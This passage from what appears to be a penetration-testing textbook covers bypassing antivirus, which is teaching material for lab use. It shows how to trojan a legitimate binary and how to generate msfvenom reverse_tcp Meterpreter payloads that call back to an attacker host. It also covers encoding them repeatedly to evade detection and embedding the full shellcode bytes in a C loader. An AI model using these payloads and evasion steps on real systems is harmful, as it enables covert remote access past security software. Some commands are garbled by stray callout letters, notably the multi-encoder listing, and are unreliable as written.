The -f flag tells Msfvenom to build the payload in the executable format.
Once created, run the trojaned binary on either the Windows XP or
Windows 7 target. The Radmin Viewer program should appear to run
normally (Figure 12-1), but the embedded payload should give us a Meter-
preter session if we set up a handler using the multi/handler module.
Figure 12-1: Trojaned Radmin Viewer executable
Bypassing Antivirus Applications 259
CHeCking for troJans witH tHe mD5 HasH
Our trojaned binary should convince the average user that the program is legiti-
mate . Security-savvy users should verify the integrity of a downloaded file before
running it by checking its MD5 hash against the value published by the vendor,
where available . An MD5 hash is a kind of file fingerprint; if changes are made
to the file, the MD5 hash will change .
Let’s compare the MD5 hashes of the original radmin.exe with our trojaned
version . In Kali Linux, the md5sum program will calculate a file’s MD5 hash . Run
md5sum on both binaries, and you’ll find that the hash values are dramatically
different, as you can see here at u and v .
root@kali:~# md5sum /usr/share/windows-binaries/radmin.exe
u2d219cc28a406dbfa86c3301e8b93146 /usr/share/windows-binaries/radmin.exe
root@kali:~# md5sum radmin.exe
v4c2711cc06b6fcd300037e3cbdb3293b radmin.exe
However, the MD5 hashing algorithm is not perfect, and a tampered
binary could have the same MD5 hash as the original file, which is known as
an MD5 collision attack . For this reason, many vendors publish a Secure Hash
Algorithm (SHA) hash as well .
Of course, checking two separate hash values is better than checking one .
The SHA family contains multiple hashing algorithms, and the version used will
vary among vendors . Kali comes with programs for various SHA hashes . For
example, sha512sum calculates the 64-bit block size SHA-2 hash, as shown here .
root@kali:~# sha512sum /usr/share/windows-binaries/radmin.exe
5a5c6d0c67877310d40d5210ea8d515a43156e0b3e871b16faec192170acf29c9cd4e495d2e03b8d
7ef10541b22ccecd195446c55582f735374fb8df16c94343 /usr/share/windows-binaries/
radmin.exe
root@kali:~# sha512sum radmin.exe
f9fe3d1ae405cc07cd91c461a1c03155a0cdfeb1d4c0190be1fb350d43b4039906f8abf4db592b060
d5cd15b143c146e834c491e477718bbd6fb9c2e96567e88 radmin.exe
When installing software, be sure to calculate the hash(es) of your down-
loaded version, and compare it to the value(s) published by the vendor .
how antivirus applications work
Before we try different techniques to get our Metasploit payloads past an
antivirus program, let’s discuss how these programs work. Most antivirus
solutions start by comparing potentially dangerous code to a set of patterns
and rules that make up the antivirus definitions, which match known mali-
cious code. Antivirus definitions are updated regularly as new malware is
identified by each vendor. This sort of identification is called static analysis.
260 Chapter 12
In addition to static analysis against a set of signatures, more advanced
antivirus solutions also test for malicious activity, called dynamic analysis. For
example, a program that tries to replace every file on the hard drive or con-
nects to a known botnet command and control server every 30 seconds is
exhibiting potentially malicious activity and may be flagged.
note Some antivirus products, such as Google’s Bouncer, run new apps that are uploaded
to the Google Play store and pass static analysis in an isolated sandbox to try to detect
malicious activity that doesn’t have a known malicious signature.
microsoft security essentials
As we use different methods in this section to bring down our detection
rate, keep in mind that even if you not able to get a 0 percent detection
rate among all antivirus vendors, if you know which antivirus solution
is deployed in your client’s environment, you can focus your efforts on
clearing just that antivirus program. In this chapter, we will try to bypass
Microsoft Security Essentials using various methods.
When we created our Windows 7 target in Chapter 1, we installed
Microsoft Security Essentials, but we didn’t turn on real-time protection to
scan files as they are downloaded or installed. Now let’s turn on this protec-
tion to see if we can create an undetectable trojan. Open Microsoft Security
Essentials, select the Settings tab, choose Real-time protection, and check
the box to turn on the service, as shown in Figure 12-2. Click Save changes.
Figure 12-2: Microsoft Security Essentials real-time protection
Bypassing Antivirus Applications 261
As of this writing, even free antivirus solutions like Microsoft Security
Essentials do a good job of catching Metasploit payloads. For a real test, try
installing the trojaned radmin.exe with real-time protection turned on. You
should see a pop-up at the bottom-right corner of the screen, like the one
shown in Figure 12-3. The file is automatically deleted before the user can
run it—that certainly puts a damper on things.
Figure 12-3: Malicious software detected
Virustotal
One way to see which antivirus solutions will flag a program as malicious is
to upload the file in question to the VirusTotal website (https://www.virustotal
.com/). As of this writing, VirusTotal scans uploaded files with 51 antivirus
programs and reports which ones detect malware. VirusTotal is shown in
Figure 12-4.
Figure 12-4: VirusTotal
To see which antivirus programs detect our trojaned radmin.exe as
currently written, upload the file to VirusTotal and click Scan it!. Because
antivirus definitions are constantly updated, your results will differ, but as
you can see in Fig ure 12-5, 25 of 51 scanners detected our file as malicious.
(The bottom of the page shows which scanners detected the malware.)
262 Chapter 12
Figure 12-5: Trojaned binary antivirus detection
note VirusTotal shares uploaded binaries with antivirus vendors so they can write sig-
natures to match. Antivirus companies use VirusTotal signatures to improve their
detection engines, so anything you upload to the site may be caught by antivirus soft-
ware just because you uploaded it. To avoid that risk, you can install the antivirus
product on a virtual machine and test your trojans manually against it, as we did in the
previous section.
getting Past an antivirus Program
Clearly if we want to get past antivirus solutions, we need to try harder to
hide. Let’s look at some other useful ways to hide our Metasploit payloads
besides simply placing them inside of an executable.
Encoding
Encoders are tools that allow you to avoid characters in an exploit that
would break it. (You’ll learn more about these requirements when we write
our own exploits in Chapters 16 through 19.) At the time of this writing,
Metasploit supports 32 encoders. Encoders mangle the payload and pre-
pend decoding instructions to be executed in order to decode the payload
before it is run. It is a common misperception that Metasploit’s encoders
were designed to help bypass antivirus programs. Some Metasploit encod-
ers create polymorphic code, or mutating code, which ensures that the
encoded payload looks different each time the payload is generated. This
process makes it more difficult for antivirus vendors to create signatures
for the payload, but as we will see, it is not enough to bypass most antivirus
solutions.
Bypassing Antivirus Applications 263
To list all of the encoders available in Msfvenom, use the -l encoders
option, as shown in Listing 12-2.
root@kali:~# msfvenom -l encoders
Framework Encoders
==================
Name Rank Description
---- ---- -----------
cmd/generic_sh good Generic Shell Variable Substitution Command Encoder
cmd/ifs low Generic ${IFS} Substitution Command Encoder
--snip—
ux86/shikata_ga_nai excellent Polymorphic XOR Additive Feedback Encoder
--snip--
Listing 12-2: Msfvenom encoders
The only encoder with an excellent rank is x86/shikata_ga_nai u.
Shikata Ga Nai is Japanese for “It can’t be helped.” Encoder rankings are
based on the entropy level of the output. With shikata_ga_nai, even the
decoder stub is polymorphic. The nitty-gritty details of how this encoder
works are beyond the scope of this book, but suffice it to say that it mangles
payloads beyond easy recognition.
Tell Msfvenom to use the shikata_ga_nai encoder with the -e flag, as
shown in Listing 12-3. Additionally, for further obfuscation, we’ll run our
payload through an encoder multiple times, encoding the output from the
previous round with the -i flag and specifying the number of encoding
rounds (10 in this case).
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9
LPORT=2345 -e x86/shikata_ga_nai -i 10 -f exe > meterpreterencoded.exe
[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)
[*] x86/shikata_ga_nai succeeded with size 344 (iteration=2)
--snip--
[*] x86/shikata_ga_nai succeeded with size 533 (iteration=9)
[*] x86/shikata_ga_nai succeeded with size 560 (iteration=10)
Listing 12-3: Creating an encoded executable with Msfvenom
Now upload the resulting binary to VirusTotal. As you can see in Fig-
ure 12-6, 35 of the tested antivirus products detected our payload, even
with the encoding. That’s a higher detection rate than we found when
embedding our payload inside a prebuilt executable. In other words,
shikata_ga_nai alone doesn’t do the trick.
264 Chapter 12
Figure 12-6: VirusTotal results for an encoded binary
To see if we can improve our results, we can try experimenting with
using multiple Metasploit encoders on our payload. For example, we
can combine multiple rounds of shikata_ga_nai with another Metasploit
encoder, x86/bloxor, as shown in Listing 12-4.
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9
LPORT=2345 -e x86/shikata_ga_nai -i 10 -f rawu > meterpreterencoded.binv
[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)
--snip--
[*] x86/shikata_ga_nai succeeded with size 560 (iteration=10)
root@kali:~# msfvenom -p -w -f exe -a x86x --platform windowsy -e x86/bloxor
-i 2 > meterpretermultiencoded.exe  radminencoded.exe
This gave only a slight improvement: The payload was detected by
21 antivirus programs. And, unfortunately, Microsoft Security Essentials
flagged both executables as malicious, as shown in Figure 12-7. We need to
look beyond Metasploit encoders if we’re going to get past antivirus detec-
tion on our Windows 7 target.
Figure 12-7: Microsoft is still flagging this binary as malicious.
Custom Cross Compiling
As the de facto standard for penetration testing, Metasploit gets a fair
amount of attention from antivirus vendors who make detecting the sig-
natures for payloads generated by Msfvenom a priority. When Msfvenom
creates an executable, it uses prebuilt templates that antivirus vendors can
use to build detection signatures.
Perhaps we can improve our ability to bypass antivirus solutions by com-
piling an executable ourselves using raw shellcode. Let’s start with a simple
266 Chapter 12
C template, as shown in Listing 12-5. (We discussed the basics of C pro-
gramming in Chapter 3. Review that section if this program doesn’t make
sense to you.) Save this code to a file called custommeterpreter.c.
#include 
unsigned char random[]= u
unsigned char shellcode[]= v
int main(void) w
{
((void (*)())shellcode)();
}
Listing 12-5: Custom executable template
We need to fill in data for the variables random u and shellcode v, which
are both unsigned character arrays. Our hope is that adding some random-
ness and compiling our own C code will be enough to trick antivirus pro-
grams. The random variable will introduce some randomness to the template.
The shellcode variable will hold the raw hexadecimal bytes of the payload we
create with Msfvenom. The main function w runs when our compiled C pro-
gram starts and executes our shellcode.
Create your payload in Msfvenom as usual, except this time set the for-
mat with the -f flag to c, as shown in Listing 12-6. This will create hex bytes
that we can drop into our C file.
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9
LPORT=2345 -f c -e x86/shikata_ga_nai -i 5
unsigned char buf[] =
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
--snip--
"\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6"
"\x85\xf6\x75\xec\xc3";
Listing 12-6: Creating a raw payload in C format
Finally, we need to add some randomness. A good place to find ran-
domness on a Linux system is in the /dev/urandom file. This file is specifically
designed as a pseudorandom number generator; it generates data using
entropy in the Linux system.
But if we just cat out data from /dev/urandom, we’ll get a lot of unprint-
able characters. To get the proper data for a character array, we’ll use the tr
Linux utility to translate the /dev/urandom data to printable characters. Use
tr -dc A-Z-a-z-0-9, and then pipe the commands into the head command to
output only the first 512 characters from /dev/urandom, as shown here.
root@kali:~# cat /dev/urandom | tr -dc A-Z-a-z-0-9 | head -c512
s0UULfhmiQGCUMqUd4e51CZKrvsyIcLy3EyVhfIVSecs8xV-JwHYlDgfiCD1UEmZZ2Eb6G0no4qjUI
IsSgneqT23nCfbh3keRfuHEBPWlow5zX0fg3TKASYE4adL
--snip--
Bypassing Antivirus Applications 267
Now drop the data from /dev/urandom into the random variable in the
C file. The finished file is shown in Listing 12-7. (Of course, your random-
ness and encoded payload will differ.) Be sure to surround the string with
quotes and use a semicolon (;) at the end.
#include 
unsigned char random[]= "s0UULfhmiQGCUMqUd4e51CZKrvsyIcLy3EyVhfIVSecs8xV-JwHYlDgfiCD1UEmZZ2Eb6G
0no4qjUIIsSgneqT23nCfbh3keRfuHEBPWlow5zX0fg3TKASYE4adLqB-3X7MCSL9SuqlChqT6zQkoZNvi9YEWq4ec8
-ajdsJW7s-yZOKHQXMTY0iuawscx57e7Xds15GA6rGObF4R6oILRwCwJnEa-4vrtCMYnZiBytqtrrHkTeNohU4gXcVIem
-lgM-BgMREf24-rcW4zTi-Zkutp7U4djgWNi7k7ULkikDIKK-AQXDp2W3Pug02hGMdP6sxfR0xZZMQFwEF-apQwMlog4Trf
5RTHFtrQP8yismYtKby15f9oTmjauKxTQoJzJD96sA-7PMAGswqRjCQ3htuWTSCPleODITY3Xyb1oPD5wt-G1oWvavrpewe
LERRN5ZJiPEpEPRTI62OB9mIsxex3omyj10bEha43vkerbN0CpTyernsK1csdLmHRyca";
unsigned char shellcode[]= "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
"\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
"\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a"
"\x05\x68\x0a\x00\x01\x09\x68\x02\x00\x09\x29\x89\xe6\x6a\x10"
"\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e"
"\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56"
"\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10"
"\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a"
"\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6"
"\x85\xf6\x75\xec\xc3";
int main(void)